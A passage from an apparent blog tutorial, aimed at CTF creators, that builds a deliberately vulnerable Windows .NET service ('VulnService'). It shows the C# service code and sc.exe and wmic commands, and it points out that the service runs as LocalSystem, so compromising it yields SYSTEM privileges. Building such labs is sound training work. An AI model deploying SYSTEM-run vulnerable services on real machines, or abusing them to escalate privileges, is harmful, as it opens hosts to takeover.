</span></span><span class="line"><span class="cl">            <span class="n">SetServiceStatus</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">ServiceHandle</span><span class="p">,</span> <span class="k">ref</span> <span class="n">serviceStatus</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// Update the service state to Stopped.</span>
</span></span><span class="line"><span class="cl">            <span class="n">serviceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="p">=</span> <span class="n">ServiceState</span><span class="p">.</span><span class="n">SERVICE_STOPPED</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">SetServiceStatus</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">ServiceHandle</span><span class="p">,</span> <span class="k">ref</span> <span class="n">serviceStatus</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">protected</span> <span class="kd">override</span> <span class="k">void</span> <span class="n">OnContinue</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">eventLog1</span><span class="p">.</span><span class="n">WriteEntry</span><span class="p">(</span><span class="s">&#34;In OnContinue.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="k">void</span> <span class="n">OnTimer</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">ElapsedEventArgs</span> <span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// TODO: Insert monitoring activities here.</span>
</span></span><span class="line"><span class="cl">            <span class="n">eventLog1</span><span class="p">.</span><span class="n">WriteEntry</span><span class="p">(</span><span class="s">&#34;Monitoring the System&#34;</span><span class="p">,</span> <span class="n">EventLogEntryType</span><span class="p">.</span><span class="n">Information</span><span class="p">,</span> <span class="n">eventId</span><span class="p">++);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">enum</span> <span class="n">ServiceState</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">SERVICE_STOPPED</span> <span class="p">=</span> <span class="m">0x00000001</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">SERVICE_START_PENDING</span> <span class="p">=</span> <span class="m">0x00000002</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">SERVICE_STOP_PENDING</span> <span class="p">=</span> <span class="m">0x00000003</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">SERVICE_RUNNING</span> <span class="p">=</span> <span class="m">0x00000004</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">SERVICE_CONTINUE_PENDING</span> <span class="p">=</span> <span class="m">0x00000005</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">SERVICE_PAUSE_PENDING</span> <span class="p">=</span> <span class="m">0x00000006</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">SERVICE_PAUSED</span> <span class="p">=</span> <span class="m">0x00000007</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="na">
</span></span></span><span class="line"><span class="cl"><span class="na">        [StructLayout(LayoutKind.Sequential)]</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="k">struct</span> <span class="nc">ServiceStatus</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="kt">int</span> <span class="n">dwServiceType</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="n">ServiceState</span> <span class="n">dwCurrentState</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="kt">int</span> <span class="n">dwControlsAccepted</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="kt">int</span> <span class="n">dwWin32ExitCode</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="kt">int</span> <span class="n">dwServiceSpecificExitCode</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="kt">int</span> <span class="n">dwCheckPoint</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="kt">int</span> <span class="n">dwWaitHint</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is how the <code>Program.cs</code> code looks like this as well:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.ServiceProcess</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Threading.Tasks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">VulnService</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">internal</span> <span class="kd">static</span> <span class="k">class</span> <span class="nc">Program</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="cs">/// &lt;summary&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="cs">/// The main entry point for the application.</span>
</span></span><span class="line"><span class="cl">        <span class="cs">/// &lt;/summary&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">ServiceBase</span><span class="p">[]</span> <span class="n">ServicesToRun</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">ServicesToRun</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ServiceBase</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">VulnService</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">            <span class="n">ServiceBase</span><span class="p">.</span><span class="n">Run</span><span class="p">(</span><span class="n">ServicesToRun</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is when we&rsquo;ll <strong>STOP</strong> following the documentation. I believe in Microsoft documentation so I thought that it&rsquo;ll be ideal for building the fundamentals of building services with .NET framework. At least, if you didn&rsquo;t know what a .NET service code looked like, well now you know. As always, we as CTF creators should be creative in the services that we want to create.</p>
<h2 id="building-the-service-using-sc">Building The Service using SC</h2>
<p>We&rsquo;ll build the solution now:</p>
<figure><a class="lightgallery" href="/images/posts/vs-13.png" title="/images/posts/vs-13.png" data-thumbnail="/images/posts/vs-13.png" data-sub-html="<h2>VS Build Solution</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-13.png"
            data-srcset="/images/posts/vs-13.png, /images/posts/vs-13.png 1.5x, /images/posts/vs-13.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-13.png" />
    </a><figcaption class="image-caption">VS Build Solution</figcaption>
    </figure>
<p>Let&rsquo;s see if the executable was compiled or created:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="nb">dir </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">VulnService</span><span class="p">\</span><span class="n">VulnService</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Debug</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">VulnService</span><span class="p">\</span><span class="n">VulnService</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Debug</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
</span></span><span class="line"><span class="cl"><span class="p">----</span>                 <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
</span></span><span class="line"><span class="cl"><span class="n">-a</span><span class="p">----</span>          <span class="mf">3</span><span class="p">/</span><span class="mf">9</span><span class="p">/</span><span class="mf">2022</span>  <span class="mf">12</span><span class="err">:</span><span class="mf">06</span> <span class="n">AM</span>           <span class="mf">7168</span> <span class="n">VulnService</span><span class="p">.</span><span class="py">exe</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We&rsquo;re gonna run a command prompt as <strong>administrator</strong> or a PowerShell console as <strong>administrator</strong> to create the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">create</span> <span class="s2">&#34;VulnService&#34;</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&#34;C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">CreateService</span> <span class="n">SUCCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s query the configuration of the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">qc</span> <span class="s2">&#34;VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">QueryServiceConfig</span> <span class="n">SUCCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">START_TYPE</span>         <span class="err">:</span> <span class="mf">3</span>   <span class="n">DEMAND_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">ERROR_CONTROL</span>      <span class="err">:</span> <span class="mf">1</span>   <span class="n">NORMAL</span>
</span></span><span class="line"><span class="cl">        <span class="n">BINARY_PATH_NAME</span>   <span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">VulnService</span><span class="p">\</span><span class="n">VulnService</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Debug</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl">        <span class="n">LOAD_ORDER_GROUP</span>   <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">TAG</span>                <span class="err">:</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">DISPLAY_NAME</span>       <span class="err">:</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="n">DEPENDENCIES</span>       <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START_NAME</span> <span class="err">:</span> <span class="n">LocalSystem</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we&rsquo;re gonna attempt to start the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">sc start </span><span class="s2">&#34;VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">STATE</span>              <span class="err">:</span> <span class="mf">2</span>  <span class="n">START_PENDING</span>
</span></span><span class="line"><span class="cl">                                <span class="p">(</span><span class="n">NOT_STOPPABLE</span><span class="p">,</span> <span class="n">NOT_PAUSABLE</span><span class="p">,</span> <span class="n">IGNORES_SHUTDOWN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">WIN32_EXIT_CODE</span>    <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_EXIT_CODE</span>  <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">CHECKPOINT</span>         <span class="err">:</span> <span class="n">0x0</span>
</span></span><span class="line"><span class="cl">        <span class="n">WAIT_HINT</span>          <span class="err">:</span> <span class="n">0x7d0</span>
</span></span><span class="line"><span class="cl">        <span class="n">PID</span>                <span class="err">:</span> <span class="mf">4892</span>
</span></span><span class="line"><span class="cl">        <span class="n">FLAGS</span>              <span class="err">:</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: We can see the START_PENDING state.</p>
</blockquote>
<p>Now we are going to query the current status of a service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">query</span> <span class="s2">&#34;VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">STATE</span>              <span class="err">:</span> <span class="mf">4</span>  <span class="n">RUNNING</span>
</span></span><span class="line"><span class="cl">                                <span class="p">(</span><span class="n">STOPPABLE</span><span class="p">,</span> <span class="n">NOT_PAUSABLE</span><span class="p">,</span> <span class="n">ACCEPTS_SHUTDOWN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">WIN32_EXIT_CODE</span>    <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_EXIT_CODE</span>  <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">CHECKPOINT</span>         <span class="err">:</span> <span class="n">0x0</span>
</span></span><span class="line"><span class="cl">        <span class="n">WAIT_HINT</span>          <span class="err">:</span> <span class="n">0x0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can see at the STATE value that&rsquo;s RUNNING.</p>
<p>Now let&rsquo;s see if we can stop the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">stop</span> <span class="s2">&#34;VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">STATE</span>              <span class="err">:</span> <span class="mf">3</span>  <span class="n">STOP_PENDING</span>
</span></span><span class="line"><span class="cl">                                <span class="p">(</span><span class="n">STOPPABLE</span><span class="p">,</span> <span class="n">NOT_PAUSABLE</span><span class="p">,</span> <span class="n">ACCEPTS_SHUTDOWN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">WIN32_EXIT_CODE</span>    <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_EXIT_CODE</span>  <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">CHECKPOINT</span>         <span class="err">:</span> <span class="n">0x0</span>
</span></span><span class="line"><span class="cl">        <span class="n">WAIT_HINT</span>          <span class="err">:</span> <span class="n">0x0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: We can see the STOP_PENDING state.</p>
</blockquote>
<p>Again we are going to query the current status of a service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">query</span> <span class="s2">&#34;VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">STATE</span>              <span class="err">:</span> <span class="mf">1</span>  <span class="n">STOPPED</span>
</span></span><span class="line"><span class="cl">        <span class="n">WIN32_EXIT_CODE</span>    <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_EXIT_CODE</span>  <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">CHECKPOINT</span>         <span class="err">:</span> <span class="n">0x0</span>
</span></span><span class="line"><span class="cl">        <span class="n">WAIT_HINT</span>          <span class="err">:</span> <span class="n">0x0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The service STATE value changed to STOPPED, so the service stopped.</p>
<p>Now we know that the service worked successfully as expected.</p>
<h2 id="managing-services-with-servicesmsc">Managing Services with Services.msc</h2>
<p>Most system administrators use the <code>services.msc</code> application to manage services:</p>
<figure><a class="lightgallery" href="/images/posts/services-msc.png" title="/images/posts/services-msc.png" data-thumbnail="/images/posts/services-msc.png" data-sub-html="<h2>Services.msc</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/services-msc.png"
            data-srcset="/images/posts/services-msc.png, /images/posts/services-msc.png 1.5x, /images/posts/services-msc.png 2x"
            data-sizes="auto"
            alt="/images/posts/services-msc.png" />
    </a><figcaption class="image-caption">Services.msc</figcaption>
    </figure>
<p>The Service Control Manager assigns the user LocalSystem upon creating a service by default and custom services shouldn&rsquo;t be run as <code>NT AUTHORITY\SYSTEM</code>:</p>
<figure><a class="lightgallery" href="/images/posts/sc-localsystem.png" title="/images/posts/sc-localsystem.png" data-thumbnail="/images/posts/sc-localsystem.png" data-sub-html="<h2>Service Account LocalSystem</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/sc-localsystem.png"
            data-srcset="/images/posts/sc-localsystem.png, /images/posts/sc-localsystem.png 1.5x, /images/posts/sc-localsystem.png 2x"
            data-sizes="auto"
            alt="/images/posts/sc-localsystem.png" />
    </a><figcaption class="image-caption">Service Account LocalSystem</figcaption>
    </figure>
<p>If we can compromise this service we can escalate to LocalSystem ( <code>NT AUTHORITY\SYSTEM</code>).</p>
<h2 id="managing-services-via-service-control-manager">Managing Services via Service Control Manager</h2>
<p>Query the configuration of a service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sc.exe qc &lt;name&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Query the current status of a service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sc.exe query &lt;name&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Modify the configuration of a service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sc.exe config &lt;name&gt; &lt;option&gt;= &lt;value&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Start or Stop a service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sc start &#34;VulnService&#34;
</span></span><span class="line"><span class="cl">sc stop &#34;VulnService&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: This Service Control Manager commands don&rsquo;t work well with PowerShell, they must be runned from a command-prompt.</p>
</blockquote>
<h2 id="managing-services-via-wmic">Managing Services via WMIC</h2>
<p>Alternatively, we can use wmic:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">wmic</span> <span class="n">service</span> <span class="n">VulnService</span> <span class="n">call</span> <span class="n">startservice</span>
</span></span><span class="line"><span class="cl"><span class="n">Executing</span> <span class="p">(\\</span><span class="nb">desktop-bn</span><span class="p">\</span><span class="n">ROOT</span><span class="p">\</span><span class="n">CIMV2</span><span class="err">:</span><span class="n">Win32_Service</span><span class="p">.</span><span class="n">Name</span><span class="p">=</span><span class="s2">&#34;VulnService&#34;</span><span class="p">)-&gt;</span><span class="n">startservice</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">Method</span> <span class="n">execution</span> <span class="n">successful</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Out</span> <span class="n">Parameters</span><span class="err">:</span>
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="n">of</span> <span class="n">__PARAMETERS</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ReturnValue</span> <span class="p">=</span> <span class="mf">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">wmic</span> <span class="n">service</span> <span class="n">VulnService</span> <span class="n">call</span> <span class="n">stopservice</span>
</span></span><span class="line"><span class="cl"><span class="n">Executing</span> <span class="p">(\\</span><span class="nb">desktop-bn</span><span class="p">\</span><span class="n">ROOT</span><span class="p">\</span><span class="n">CIMV2</span><span class="err">:</span><span class="n">Win32_Service</span><span class="p">.</span><span class="n">Name</span><span class="p">=</span><span class="s2">&#34;VulnService&#34;</span><span class="p">)-&gt;</span><span class="n">stopservice</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">Method</span> <span class="n">execution</span> <span class="n">successful</span><span class="p">.</span>
